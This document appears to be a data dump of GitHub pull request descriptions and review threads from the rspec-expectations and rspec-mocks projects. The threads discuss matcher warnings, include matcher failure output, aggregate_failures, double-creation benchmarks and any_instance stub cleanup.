  * https://www.relishapp.com/rspec/rspec-expectations/v/2-12/docs/built-in-matchers/have-n-items-matcher","[""I also reported the fixing the intra-word italics thing as a bug/feature request to relishapp. github flavored markdown and stackoverflow markdown both treat this differently IINM. This PR fixes more issues regardless, but I figured I'd mention it in case anybody had the notion to bug @mattwynne about it :smiley: "", 'Ok, I think this is good to go. I verified that the triple backtick ruby markdown blocks work as expected on relishapp', 'Thanks @soulcutter.  These sorts of fixes aren\'t usually ""fun"" and don\'t get much credit but they\'re important and I appreciate it!', ""Okay I'm here. Is there still something I need to fix in Relish?"", ""> Okay I'm here. Is there still something I need to fix in Relish?\r\n\r\nNope.  We were just trying to figure out what the best way is to put code sections in the free-text feature description part of a feature file so that they render well on relish.  @soulcutter figured it out through trial and error.  Thanks for checking in, though!""]"
571,rspec/rspec-expectations,734.0,Ping @myronmarston I went through and isolated out specs from the standard library.,"['This LGTM.  I\'d still like to understand what problem you feel this solves, though.  In #730 you said:\r\n\r\n> That\'s only half my concern. The rest of it is external test suites.\r\n\r\nI still don\'t understand what ""the rest of it is external test suites"" means.  Can you explain a problem external test suites would have that this will solve?', ""Yeah I think I might have been wrong with the initial implications of using `require` in our specs but I'd still like to do this to be on the safe side, initially the missing `require` was highlighted by a build over on `rspec-core` but I'd still like us not to have these components loaded if we don't need to. I feel it reduces our cross section and makes us less likely to accidentally rely on the standard library.\r\n\r\n IMO this is important and I actually noticed Travis was far more sensitive to missing components than my own machine, I'm hypothesising that this is related to me using rvm and not bundler bin stubs..."", ""> IMO this is important and I actually noticed Travis was far more sensitive to missing components than my own machine, I'm hypothesising that this is related to me using rvm and not bundler bin stubs...\r\n\r\nDo you use `--standalone` (as our travis builds do and I do)?  Besides speeding things up by avoiding the bundler tax at runtime, the act of avoiding bundler/rubygems at runtime means any stdlibs used by those aren't automatically loaded, which could affect here.\r\n\r\nAnyhow, merge away."", '> Do you use --standalone (as our travis builds do and I do)? Besides speeding things up by avoiding the bundler tax at runtime\r\n\r\nNope, I have rvm gemsets instead, same performance enhancement.']"
572,rspec/rspec-expectations,757.0,Supersedes #756 (and #755).  I forced the commit SHA to be different so that hopefully travis will build it.,"[""Now it's building.  Somehow this repo go turned off on travis.  I had to turn it back on to make it work and push once more."", 'Hmm, looks like this fails on 1.9.2 and 1.8.7 :cry: ', ""So for some reason `.message` on error wasn't returning a string on 1.8.7. I don't even lol."", 'This needs to be rebased before appveyor will build it again.', 'LGTM, merge when the build is done.', 'Thoughts on backporting to 3.2?', 'Yeah I think thats acceptable, done']"
573,rspec/rspec-expectations,768.0,Issues a warning (which can be supressed) when using a bare `raise_error` call. Fixes #655.,"[""So I'm realizing that this is going a different direction then we did for the issue of `expect { }.not_to raise_error(something_specific)` being prone to false positives -- there we raise an error.  It seems odd to raise for one form that's prone to false positives but warn for another.\r\n\r\nI'm also realizing that we may have other places in the future where we realize that a particular use of matcher is prone to false positives and should be discouraged.\r\n\r\nGiven that, I'm thinking maybe we do the following:\r\n\r\n* Move the config for this off of `RaiseError` and onto `RSpec::Expectations.configuration`, as I suggested below.\r\n* Rename it to `warn_about_possible_false_positives` and use it for this and for any other future cases where there's a potential false positive situation.\r\n* Update the `raise_error` logic for the negative case to align with this -- it should either warn (if the config is set) or allow the potential false positive.\r\n\r\nThoughts?"", 'Yup, agree', ""This is changed as discussed, I'll tackle changing `raise_error` for the negative case in a separate PR"", 'Woop fixed Rubocop', 'This should be good to go now?', ""Left a couple comments but they aren't super important.  Feel free to merge w/o addressing them."", 'LGTM, merge when green.']"
574,rspec/rspec-expectations,775.0,Follow up to #768.  @JonRowe said he planned to do this but I wanted to open an issue so we don't forget.,"[""BTW, the config added in #768 is named `warn_about_false_positives` but I think it would be better as `warn_about_potential_false_positives`.  IMO that's better because `expect { }.to raise_error` isn't necessarily a false positive -- in fact, most of the time it's probably not.  It's a potential false positive, though, and that's why it warrants a warning.  I think it's confusing for a config option named `warn_about_false_positives` to trigger a warning in a situation that's not a false positive.\r\n\r\nWDTY of changing the config option name as part of the PR for this, @JonRowe?"", 'Sure, will do', 'Ping @myronmarston ', 'Ok I defactored it', ""The comment I left above isn't a merge blocker."", ':+1:']"
575,rspec/rspec-expectations,780.0,"Fixes #771 

Reimplements the `include` matcher to account for all divergent items (excluded when expected to be included in actual or included when expected to be excluded in actual) to be used in example failure output. Now when something is missing from an expectation of inclusion, the failure output will more helpfully tell you what exactly was missing rather than a full description of the expected items.

Most basic example:
```plaintext
# Current output
Failure/Error: expect(""abc"").to include(""a"", ""d"", ""c"")
       expected ""abc"" to include ""a"", ""d"", and ""c""

Failure/Error: expect({ :a => 7, :b => 5 }).not_to include(:a => 7, :d => 3)
       expected {:a => 7, :b => 5} not to include {:a => 7, :d => 3}

# Revised output with this PR
Failure/Error: expect(""abc"").to include(""a"", ""d"", ""c"")
       expected ""abc"" to include ""d""
       # ""a"" and ""c"" were indeed included, so only ""d"" is mentioned

Failure/Error: expect({ :a => 7, :b => 5 }).not_to include(:a => 7, :d => 3)
       expected {:a => 7, :b => 5} not to include {:a => 7}
       # :d => 3 was indeed not included, so only :a => 7 is mentioned
```

~~My ramblings on performance in the associated issue are addressed in this implementation; my first [poorly written] attempt at this prompted my confused comment but I believe this one works quite well and I benchmarked it extensively. It has little to no impact~~

Includes benchmarks; a [potentially] large hit in failures for includes is expected; instead of fulfilling a failed match and stopping execution, we now continue comparing the rest of `expected` to `actual` for the new failure output. ","[""> I believe this one works quite well and I benchmarked it extensively. It has little to no impact :+1:\r\n\r\nDo you mind including your benchmarks?  We like to keep benchmarks around in `benchmarks`.  If you do that, a couple suggestions over the old benchmark you had:\r\n\r\n* Use `benchmark-ips` over `benchmark` -- the former provides better output and makes comparisons easier.  (You'll have to add it to `Gemfile-custom`).\r\n* Your benchmark before was using the matcher in an rspec-core example.  This causes rspec-core's overhead to be included in the benchmark.  IMO it's better to benchmark just the matcher w/o rspec-core.  You can do that by including `RSpec::Matchers` in a custom context (e.g. a class you define for this purpose) and then write an expectation in that context (you'll have to rescue `RSpec::Expectations::ExpectationNotMetError` for the failing case).\r\n* When you use `benchmark-ips` you'll need to have both implementations available in the same process (rather than running a benchmark against 2 different commits).  I tend to do that by copying the original implementation into the file and renaming it so that you can directly compare it against the new implementation.\r\n\r\nWith the benchmark in the repo it'll give us the context of the benchmark results and allow anyone to run them."", 'BTW, ignore the rubocop failures for now.  I have some feedback that will likely address class/method length.  We can revisit the rubocop failures later.', ""> Do you mind including your benchmarks?\r\n\r\nSure, I'll rewrite/add some in the way you describe. \r\n\r\n> BTW, ignore the rubocop failures for now.\r\n\r\nSounds good, feedback welcome. There's obviously some duplication in my implementation but I couldn't think of a good way to eliminate that effectively without making things seemingly too complex :/\r\n\r\nLooks like I might have something else somewhere causing different Ruby versions to fail, too.\r\n\r\nWIP :)"", ""@myronmarston This should be good to look at again, now.\r\n\r\n- Fixed the last few issues related to hash output with Ruby 1.8.7\r\n- Looks like the build is still failing because there maybe be a corrupted version of nokogiri in the gem cache for Ruby 2.0.0 in Travis.\r\n- Benchmarks added; I've done little benchmarking so let me know if something doesn't look right.\r\n\r\nAs far as the benchmarks go I believe they make sense; The hit to performance in `to include (failures)`, as we mentioned earlier, is expected; where before the `#any?` determines the match and returns on the first item that failed, the other items in expected will still be checked against actual for determining the failure output. "", 'Thanks!']"
576,rspec/rspec-expectations,776.0,"This is the beginning of my solution for #733.

TODOs:

- [x] Finish cuke.
- [x] Ensure this works well with our minitest integration (we reassign the `ExpectationNotMetError` constant there which could cause problems for the new exception class since it is a subclass).
- [x] Update docs to mention how this interacts with threading.
- [x] Update rspec-core to integrate with this.
- [x] Update rspec-mocks to use the rspec-support failure notifier so that mock failures can participate in this.
- [x] Figure out how this interacts with using an expectation from within a DSL-defined custom matcher.","[""OK, this PR is ready for review.  There are a couple open questions:\r\n\r\n* What should `aggregate_failures` do when there is a single expectation failure, or not expectation failures but some other error?  At the moment it allows the exception in either case to propogate it as-is rather than wrapping it in a `MultipleExpectationsNotMetError`.  That means that the additional failure output for aggregation failure blocks (e.g. `Got x failures....`) only display when there are in fact multiple expectation failures (or a single expectation failure and some other exception).  I an see an argument for keeping the interface more uniform and having it always raise a `MultipleExpectationsNotMetError`, though.\r\n\r\n* I'm struggling to figure out the best way to handle the cuke.  Currently it's labeled `@wip` because the formatting logic (which it relies upon, because it shows how it is formatted nicely in the output) is in rspec/rspec-core#1946.  That worries me, because if we ever decide to change that formatting in rspec-core, it would break the cuke here which could be annoying to deal with.  OTOH, I'm not really sure how to write a documentation-worthy cuke scenario without including the nicely formatted rspec-core failure message, unless we write the cuke so it's example code runs outside the context of rspec-core...but that would be kinda weird since all the other cuke scenarios use rspec-core (except the specific minitest one...)  I'm not sure what a good solution is here.  There's also the `:aggregate_failures` metadata, which is covered by the cuke here as well but is really an rspec-core thing that leverages this feature.\r\n\r\n/cc @rspec/rspec (especially @xaviershay since you said you could do some code reviews for this stuff)\r\n"", 'Missing changelog.', 'Thanks for the detailed review, @xaviershay.  One bit of context that may help is rspec/rspec-support#194, which this builds on top of.', ""OK, I pushed some more updates.  I think my changes here are done with the exception of a link I'm planning to add from the cuke here to the cuke I'm going to write in rspec-core."", ""OK, I think I've addressed all the feedback.  The updated cuke is [viewable here](https://relishapp.com/rspec-staging/rspec-expectations/docs/aggregating-failures).\r\n\r\nAre you satisfied with the cuke now, @xaviershay?  Anything else needed before I merge? "", 'ship it!']"
577,rspec/rspec-expectations,207.0,"A potential solution to #206, this makes `be_predicate` fail with a nice warning when calling a private methods.

Potentially this might want to be configurable, so as not to break existing test suites? Is this a decision we want to make for the person writing the test suite? Is #206 the desired behaviour or do we want to let users make the decision about calling private methods...","[""@JonRowe -- thanks for taking a stab at this.  I've been meaning to respond to #206. I share many of the questions you mentioned above!\r\n\r\nAnyhow, let's take the conversation back to #206 where we can figure out the overall strategy to solve this, and then, if it lines up with what you've done here, we can return to this PR to discuss any remaining implementation concerns."", ""I've taken your feedback to heart, and am raising an error with a message, which actually cleans up the resulting failure messages again, however on 1.8.7 I'm now getting weird `Too many open files (Errno::EMFILE)` errors, but not on the changed feature, any hints as to what's wrong there?"", ""@JonRowe no idea :( I've never understood why that happens."", 'Just re-run today and they work, from a bit of googling seems this is a ""weird"" Heisenbug which is platform dependant... So this passes on 1.8.7 and 1.9.3', 'So my feeling here is this might be a travis weirdness, can we force it to rerun the build?', ""We can do, but I have experienced the failure locally, it's a weird Ruby heisenbug..."", ""I rebased this, so let's see what happens to the build."", 'Woo, passes', '@JonRowe I think this needs a changelog entry, but is otherwise pretty awesome. Could you add one? :+1: :green_heart: : ', ""This can't be merged until 3.0, because it'll be a breaking change.  It's definitely a good change, though!"", 'That too :)\r\n', ""@JonRowe want to merge this in now we're doing 3.0 on master?"", ""> @JonRowe want to merge this in now we're doing 3.0 on master?\r\n\r\nI thought that was after the 2.14.0 final release. Correct? No?"", ""That's what I was pushing for on the mailing list. I think master should be 2.14 until we actually ship 2.14 and not just an rc. /cc @myronmarston @soulcutter "", '@dchelimsky 2.14 dev is on the maintenance branch now. @myronmarston @alindeman and myself were chatting about this last night on irc. The 2.99 maintenance branch also exists.', 'No sense going back :)\r\n\r\n\r\nOn Tue, May 28, 2013 at 6:29 PM, Sam Phippen <notifications@github.com>wrote:\r\n\r\n> @dchelimsky <https://github.com/dchelimsky> 2.14 dev is on the\r\n> maintenance branch now. @myronmarston <https://github.com/myronmarston>\r\n> @alindeman <https://github.com/alindeman> and myself were chatting about\r\n> this last night on irc. The 2.99 maintenance branch also exists.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/rspec/rspec-expectations/pull/207#issuecomment-18587035>\r\n> .\r\n>', ""I'm going to look at this and merge it tonight"", 'I like this. :sheep: it.']"
578,rspec/rspec-expectations,261.0,"In v3 using predicates on private methods e.g. `expect(obj).to be_private_method` is not allowed, this warns of this behavioural change for `2.99`","['lol: rbx-19mode. ', ""@myronmarston I've updated the message with call_site but it won't show until an rspec-core merge is made. (see  rspec/rspec-core#925)""]"
579,rspec/rspec-expectations,298.0,"PrettyPrint was loosing the encoding of US-ASCII compatible hashes, this restores
the encoding by restoring the original encoding of the string.","['@samphippen if you get a chance to review... please do...', '\n[![Coverage Status](https://coveralls.io/builds/141767/badge)](https://coveralls.io/builds/141767)\n\nCoverage increased (+0%) when pulling **c2bcc84f1d5a367b8f260ab25a4131ef22ce5449 on encoding_fix_for_193** into **a17d97c129d5cb0237bf21d242d9de5141b7e27a on master**.\n', '@JonRowe -- thanks for taking care of this!  But please remember a changelog entry for this kind of thing in the future (I took care of it this time).', 'Argh, I keep leaving the Changelog until last to make merging easier, then always forget! Sorry!', 'No worries :).']"
580,rspec/rspec-mocks,383.0,"Also I set up a warning, but I really don't like the warning message. Couldn't think of anything much better. Thoughts?","['@myronmarston can you take another look at this :)', ""I haven't been closely following all the related issues, but the code looks good to me."", ""@myronmarston to be clear, it looks like `inner_implementation_action=` is being called before `create_message_expectation_on` when just a block is passed. I've moved this warning into matches, but I'm really not sure about that, would it be better to do this by reassigning the block in `create_message_expectation_on` after the warning flag has been set?"", 'I fixed my problem with calling the warning it in `matches?` @myronmarston wdyt about this now?', ""> I fixed my problem with calling the warning it in matches? @myronmarston wdyt about this now?\r\n\r\nThe implementation is a little hairy but it sounds like you've tried the simpler routes and they didn't work.  I'm OK with this implementation since it'll only be in one release.\r\n\r\nI left a couple more comments that I think should be addressed; then this'll be good to merge.\r\n\r\nThanks for working hard on this one...I know it's one of (if not the) most complicated deprecation warnings that will be in 2.99 so it's far from simple."", ""@myronmarston NP and thanks for the feedback. I wish I'd been able to do this faster, adjusting to my real job etc :)"", '@myronmarston if this comes back green are we good to merge?', 'Yep.']"
581,rspec/rspec-mocks,401.0,"A couple of optimisations that speed up double creation significantly. See individual commits for their contribution details.

Time to create 1000 doubles:

<img src=""https://dl.dropboxusercontent.com/u/8686208/rspec-mocks-issue-193-improvement.jpg"" />

I just cranked away with benchmark and `ruby-prof` for a while, using code like the following:

``` Ruby
n = 1000
Benchmark.bm do |bm|
  RSpec::Mocks.setup(self)

  (0..9).each do |m|
    attrs = m.times.inject({}) {|h, x|
      h[""method_#{x}""] = x
      h
    }

    bm.report(""double"") do
      n.times do
        double(attrs)
      end
    end
  end
end
```

**Notes**

* `caller` location has changed for `expected_from` definition. Pretty sure this isn't a problem.
* ""simple stub"" is a new concept, I believe it justifies itself in the speed improvement.
* Addresses #193.

R @myronmarston","['\n[![Coverage Status](https://coveralls.io/builds/153639/badge)](https://coveralls.io/builds/153639)\n\nChanges Unknown when pulling **b068746f5bdd189d3afb535685caba44adbe3098 on xaviershay:issue-193** into ** on rspec:master**.\n', ':heart: :heart: :heart:\r\n\r\nGreat work as always!  This looks like a huge improvement.  I\'m pleased to see that there weren\'t many changes needed for such big wins.  Does this bring a `double` to parity with `OpenStruct` (since that was what your original blog post compared)?  If not, it suggests we may have more room to go.\r\n\r\nCan you add whatever benchmark scripts you used to the `benchmark` dir?  We like to keep those around for reference.  It\'d be good to add comments showing results from them (particularly since one can\'t easily run them and see both before and after results).  For an example, see the benchmark here:\r\n\r\nhttps://github.com/rspec/rspec-core/blob/master/benchmarks/require_relative_v_require.rb\r\n\r\nFinally, if you\'d be so kind as to add a changelog entry it would save me from having to do that, so I can just hit the big green ""Merge"" button on the github UI :).', 'Will try to finish this up today.', ""@myronmarston ftfy\r\n\r\nSee also this diff that would change the implementation of `CleanCaller`: https://gist.github.com/xaviershay/6200981 I don't want to apply it here because it's a behaviour change and would need more testing. Should be a perf improvement (though perhaps insignificant) because it's a simpler string check than a regex."", ""I don't want to squash these commits together into one because there is value in having the different optimisations applied separately, in case one causes a regression."", '\n[![Coverage Status](https://coveralls.io/builds/154045/badge)](https://coveralls.io/builds/154045)\n\nChanges Unknown when pulling **2715a85ed9730c67910f95b0c3a2b985d89f35f5 on xaviershay:issue-193** into ** on rspec:master**.\n', ""Still quite a lot of to do to be on parity with `OpenStruct`:\r\n\r\n```\r\nstruct\r\n\r\n       user     system      total        real\r\n0 attrs  0.000000   0.000000   0.000000 (  0.000658)\r\n1 attrs  0.010000   0.000000   0.010000 (  0.011288)\r\n2 attrs  0.020000   0.000000   0.020000 (  0.021119)\r\n3 attrs  0.050000   0.000000   0.050000 (  0.046445)\r\n4 attrs  0.030000   0.000000   0.030000 (  0.034460)\r\n5 attrs  0.050000   0.010000   0.060000 (  0.053902)\r\n6 attrs  0.070000   0.000000   0.070000 (  0.068656)\r\n7 attrs  0.080000   0.000000   0.080000 (  0.087503)\r\n8 attrs  0.070000   0.000000   0.070000 (  0.079114)\r\n9 attrs  0.100000   0.000000   0.100000 (  0.101711)\r\n\r\n\r\ndouble\r\n\r\n       user     system      total        real\r\n0 attrs  0.240000   0.010000   0.250000 (  0.274263)\r\n1 attrs  0.300000   0.010000   0.310000 (  0.345199)\r\n2 attrs  0.360000   0.000000   0.360000 (  0.377987)\r\n3 attrs  0.360000   0.010000   0.370000 (  0.422910)\r\n4 attrs  0.460000   0.010000   0.470000 (  0.482736)\r\n5 attrs  0.530000   0.020000   0.550000 (  0.609680)\r\n6 attrs  0.560000   0.010000   0.570000 (  0.597064)\r\n7 attrs  0.630000   0.020000   0.650000 (  0.704257)\r\n8 attrs  0.700000   0.010000   0.710000 (  0.725934)\r\n9 attrs  0.780000   0.020000   0.800000 (  0.809369)\r\n```\r\n\r\n... but at least we're roughly `O(n)` now."", ""> See also this diff that would change the implementation of CleanCaller: https://gist.github.com/xaviershay/6200981 I don't want to apply it here because it's a behaviour change and would need more testing. Should be a perf improvement (though perhaps insignificant) because it's a simpler string check than a regex.\r\n\r\nHmm...it would be a behavior change against what we currently have in master, but using the technique of searching the caller like this is quite new to the code base and I'm not sure if we've cut a release with it yet.  If we have, it's only 2.14 that has it.  Before we used to hardcode it everywhere.  I'd say I'm in favor of what you have there if it's a perf improvement, particularly given the fact that I don't think we call any rspec-mocks APIs from core or expectations (I guess we do from rspec-rails, though, for creating `stub_model` and `mock_model`s)."", '> I don\'t want to squash these commits together into one because there is value in having the different optimisations applied separately, in case one causes a regression.\r\n\r\nIn general, I like small commits as long as they have useful commit messages.  I prefer squashing a PRs commits together when there are lots of ""Woops, correcting xyz"", ""Woops, correcting xyz in this other place"" commits, but otherwise it\'s nice to have the context of each individual commit.  So don\'t feel like you ever need to squash it together in a PR, unless you have lots of those ""mistake"" commits.', ""> Still quite a lot of to do to be on parity with OpenStruct\r\n\r\nLet's keep #193 open for now then.  I think it's great to go about this iteratively."", ""> I'd say I'm in favor of what you have there if it's a perf improvement\r\n\r\nWhile this is true, in my mind removing knowledge of other libraries should be the motivating reason. Going to apply it in a different PR since it's not relevant to this one."", ""@myronmarston fixed the 0 attribute performance regression with an early exit, and re-implemented `CleanCaller` to be more efficient which gives us a further speed bump across the board.\r\n\r\nSee `benchmark/caller.rb` for some interesting numbers.\r\n\r\nPretty sure this is good to go, assuming we can't find a better name for `CleanCaller`..."", '\n[![Coverage Status](https://coveralls.io/builds/154268/badge)](https://coveralls.io/builds/154268)\n\nChanges Unknown when pulling **84232bbf7472304e416a82d3550d37592a35dc06 on xaviershay:issue-193** into ** on rspec:master**.\n', 'Other naming suggestions from twitter: `CallSiteSource`, `ApplicationBacktrace`, `RspeclessBacktrace`, `TraceGrep`, `CallerSearch`.', '\n[![Coverage Status](https://coveralls.io/builds/154423/badge)](https://coveralls.io/builds/154423)\n\nChanges Unknown when pulling **f702f82ee8d486f2982937122018ba8cc02d094c on xaviershay:issue-193** into ** on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/154426/badge)](https://coveralls.io/builds/154426)\n\nChanges Unknown when pulling **9837d48bc940b8346f5a54d8c35e888758af6222 on xaviershay:issue-193** into ** on rspec:master**.\n', 'Renamed `CleanCaller` to `CallerFilter`.', ""Hmm, looks like ruby < 2.0 doesn't support 2 args for `caller`.  I was wondering why I had never seen or heard about the second argument before and that explains why...it's new in ruby 2.0!"", 'argh dammit, sorry I really need to get better at running my specs on earlier versions. Would you be ok with a ""conditional"" implementation so we get to keep the fast behaviour on 2+? It gives about a 30-40% benefit...', 'Yes, please do that. I\'d prefer if the conditional gets evaluated at file load time since the ruby version won\'t change between calls.\r\n\r\nSent from my iPhone\r\n\r\nOn Aug 11, 2013, at 8:48 AM, Xavier Shay <notifications@github.com> wrote:\r\n\r\n> argh dammit, sorry I really need to get better at running my specs on earlier versions. Would you be ok with a ""conditional"" implementation so we get to keep the fast behaviour on 2+? It gives about a 30-40% benefit...\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.', ""> argh dammit, sorry I really need to get better at running my specs on earlier versions\r\n\r\nNo need to apologize for this.  That's what travis is for :).\r\n\r\nFWIW, I almost never run the specs against multiple versions locally, leaving that entirely up to travis...unless I'm doing a major refactoring that I think has a high likelihood of breaking on 1.8.7.  It may help that I'm still using 1.9.3 as my primary ruby though...2.0.0, as the newest release, has the highest likelihood of supporting things that don't work on older ruby versions."", '\n[![Coverage Status](https://coveralls.io/builds/155343/badge)](https://coveralls.io/builds/155343)\n\nChanges Unknown when pulling **29f4efdcaadb94bc6814a5a99c219d4043ae75f7 on xaviershay:issue-193** into ** on rspec:master**.\n', 'Green! I also checked that performance on 1.8.7 was still better than master with this change.', '\n[![Coverage Status](https://coveralls.io/builds/155504/badge)](https://coveralls.io/builds/155504)\n\nChanges Unknown when pulling **3b6142ab6dc0768d24c9bf1195fb858f896b246b on xaviershay:issue-193** into ** on rspec:master**.\n', ""After all that work optimizing `caller`, I realised we don't even need it for this case! See https://github.com/xaviershay/rspec-mocks/commit/13e9d11542a6b60c5dc7ffa4527c98bb255d0a1f\r\n\r\nShould leave those optimisations in though, since they are helpful for other paths.\r\n\r\nCurrent benchmark is now 50% faster again: https://github.com/xaviershay/rspec-mocks/commit/b31c35ab4830524adf9e9545df18ac8aa956aa5e#L0L-50"", ""Merged...great work, as always.  This is something that's going to benefit all RSpec users :).""]"
582,rspec/rspec-mocks,404.0,"Fixes #403.

Please verify that my assumption about proxied methods is correct (per the comment in the diff.)

@soulcutter @alindeman @myronmarston","['\n[![Coverage Status](https://coveralls.io/builds/157508/badge)](https://coveralls.io/builds/157508)\n\nCoverage decreased (-0%) when pulling **9b19cfb9175840d1a6eaaf988e217166a0de5e1e on xaviershay:issue-403** into **c8139a982ec699906e6976c744021e60aaa8b3f1 on rspec:master**.\n', 'The choice not to reset was because I didn\'t see why it was necessary. Avoiding the ""method stashing"" to save any existing methods was deliberate though.\r\n\r\nI\'ll have to read through #399 more closely to understand what needs to happen here. I\'ll do that tonight.\r\n\r\nIn the meantime, up to you as to whether we should revert #401.', 'The ""simplest"" fix for #399 is that `add_simple_expectation` needs to trigger a call to `configure_method` instead of `define_proxy_method`.\r\n\r\nBetter, we should change the labelling of these methods and introduce a concept of ""aliasing"" (or something) that sets whether or not a method is intended to replace existing ones or not.\r\n\r\nAlternatively, `receive_messages` could just not use this optimisation (set normal stubs instead) and we could revisit it later.', '\n[![Coverage Status](https://coveralls.io/builds/161848/badge)](https://coveralls.io/builds/161848)\n\nCoverage decreased (-0%) when pulling **847c66d55f2ec0ffc56aa27638a3469a03ddab3d on xaviershay:issue-403** into **6cd4d5774d46dc7d5871890e38278959fd9af133 on rspec:master**.\n', ""@myronmarston It's pretty confusing. The original method is not being stashed, but that doesn't matter because it was defined on the class. So after the doubled `inspect` is removed, the original one is still present. Then we try to restore the original visibility of that method, which fails because `@original_visibility` is not saved for simple stubs.\r\n\r\nPushed up an alternate fix and spec. WDYT? There is a difference in behaviour here between normal stubs and simple stubs, namely simple stubs fail the following test.\r\n\r\n``` ruby\r\nclass MyObject\r\n  private\r\n  def my_private\r\n  end\r\nend\r\n\r\nit do\r\n  o = RSpec::Mocks.proxy_for(a = MyObject.new)\r\n  o.add_simple_stub(:my_private, 1)\r\n  reset a\r\n  expect {\r\n    a.my_private\r\n  }.to raise_error # calling private method\r\nend\r\n```\r\n\r\nThat is only possible with partial mocking though, which was not one of my intended uses of simple stubs. I added a comment saying so. We could consider fixing that behaviour if we want to use simple stubs for this purpose."", 'With this solution, the stubbed methods _do not_ hang around on the object, making #352 unnecessary for this case.', 'I like this fix.  Thanks!']"
583,rspec/rspec-mocks,402.0,"Currently the `any_instance` stub functionality doesn't remove stubs from existing instances, this is the start of a fix for #397 but potentially represents a change in behaviour. We'd also need to apply this to re-stubbing I think...

Thoughts?","[""There's an odd case we need to think carefully about...what should we do when there is an instance of the class that's directly stubbed (e.g. via `instance.stub`, not due to `klass.any_instance.stub`) and `any_instance.stub` is also used for the same method?  Should this unstub that instance as well?"", '@myronmarston I  refactored this to reduce the lookup time and handle unstubbing only any instance methods, take a look?', 'Rebased to remove build failure.', '\n[![Coverage Status](https://coveralls.io/builds/169488/badge)](https://coveralls.io/builds/169488)\n\nCoverage decreased (-0.56%) when pulling **abf019f6ec7e7f1b59f023e86be2e67c7ce70db0 on prevent_errors_on_stub_removal** into **046dd46df2ff514cd0577c1e7da0a0ea327580fc on master**.\n', ""> Added specs and solved by iterating over classes looking at both ancestor chains (required to go from super to sub and vis versa). This hyrbrid approach should be less work than just going over all proxies, as they're essentially grouped by klass at least.\r\n\r\nYour approach is interesting in novel :).  That said, I do have some concerns:\r\n\r\n* It looks to me like there's a bug lurking here, where `Subclass.any_instance.stub(:foo)` has been used and there is an instance of `Superclass`...`proxies_of(Subclass)` will return the `Superclass` instance, right?  Since `klass.ancestors.include?(proxy_klass)` will return true` for this case.  Consider the case where you have some partial mocks that were created simply as `Object.new`: won't these always be returned (since `Object` is a superclass of all classes?)\r\n* I'm concerned that this will actually make perf _worse_ than the original thing you had.  Consider that `klass.ancestors.include?` is an O(N) scan over the `ancestors` array.  Some objects have very large ancestors chains.  I just checked in a rails app we have what `User.ancestors.count` is (`User` is an ActiveRecord model) and it's 55!  Consider that the old solution was also O(N) but was O(N) over the number of objects that have a mock proxy.  I'd expect this to be smaller than 55 (a test that uses 55 test doubles and/or partial mocks seems insane).\r\n* The original code was so much simpler.  This code took me awhile to understand.\r\n\r\nAll that's to say that I think it might be best to go back to this:\r\n\r\n``` ruby\r\nproxies.each_with_object do |(_, proxy), matches|\r\n  matches << proxy if klass === proxy.object\r\nend\r\n```\r\n\r\n(Notice that I used `Class#===` rather than `object.is_a?`....I think it's more likely that someone will have messed with the methods on an individual object like `is_a?` than messed with `Class#===`)."", '\n[![Coverage Status](https://coveralls.io/builds/171401/badge)](https://coveralls.io/builds/171401)\n\nCoverage remained the same when pulling **a8b330bf3a60467395811658afe89a4662d643bd on prevent_errors_on_stub_removal** into **046dd46df2ff514cd0577c1e7da0a0ea327580fc on master**.\n', ""**TL;DR;** I dropped it back to the simpler version.\r\n\r\nPerformance wise the other code was going over the classes registered in the mock space, so the lookup was bounded, and there would be less in that hash lookup than in `proxies` but I was assuming `include?` is implemented sanely (i.e. won't walk over all the ancestors if it finds the one it's looking for, and in the common occurrence I was expecting people to be stubbing in the top few levels)\r\n\r\nThe super/sub class behaviour of `proxy_of` was the point, it's not a bug, because the unstub mechanism only clobbers stub's it knows about already, so at worst there would have been a few extra no-ops. I actually expected the simpler code version to break because of the chain, but it doesn't because we check the sub class is an instance of super, rather than checking that the super class is a sub class (which this code won't do)."", '\n[![Coverage Status](https://coveralls.io/builds/171785/badge)](https://coveralls.io/builds/171785)\n\nCoverage decreased (-0.57%) when pulling **41217bf43b5159036a473ca77b42f0a45c67c954 on prevent_errors_on_stub_removal** into **046dd46df2ff514cd0577c1e7da0a0ea327580fc on master**.\n', ""> The super/sub class behaviour of proxy_of was the point, it's not a bug, because the unstub mechanism only clobbers stub's it knows about already, so at worst there would have been a few extra no-ops. I actually expected the simpler code version to break because of the chain, but it doesn't because we check the sub class is an instance of super, rather than checking that the super class is a sub class (which this code won't do).\r\n\r\nI get what you're saying, but even though the one thing that uses `proxies_of` deals with it returning objects that are instances of superclasses, it's semantically wrong for that method to return those.  The method was essentially a lie...it was really `proxies_of_class_and_any_superclasses`.  In my experience, it's a bad idea for method to be a lie like this, as it causes confusion as soon as something else starts to use it, and is likely to cause bugs.\r\n\r\nSo thanks for changing this :).\r\n\r\nAnyhow, I pushed two simple small improvements to some specs (let me know what you think).\r\n\r\nFrom here, this needs a changelog entry.  It could also benefit from being squashed into one commit: I don't know that the intermediate commits have much value, and 9 commits is a lot for what is a pretty small change.\r\n\r\nDo you plan to backport this to 2.99 and/or 2.14?"", '\n[![Coverage Status](https://coveralls.io/builds/174422/badge)](https://coveralls.io/builds/174422)\n\nCoverage increased (+0.02%) when pulling **f585362c37b3c449cb7e54b09cd942baa6d99700 on prevent_errors_on_stub_removal** into **986e20c7f54fa2d8061c9b8d15c91d73ba150bd6 on master**.\n', 'Thanks, @JonRowe!  I took care of backporting it in 84ae8d11b8794d1ed78c7efa4fd47f3468e0e830 and 21c60d65340ad0c1857f269886e0264cb2788360']"
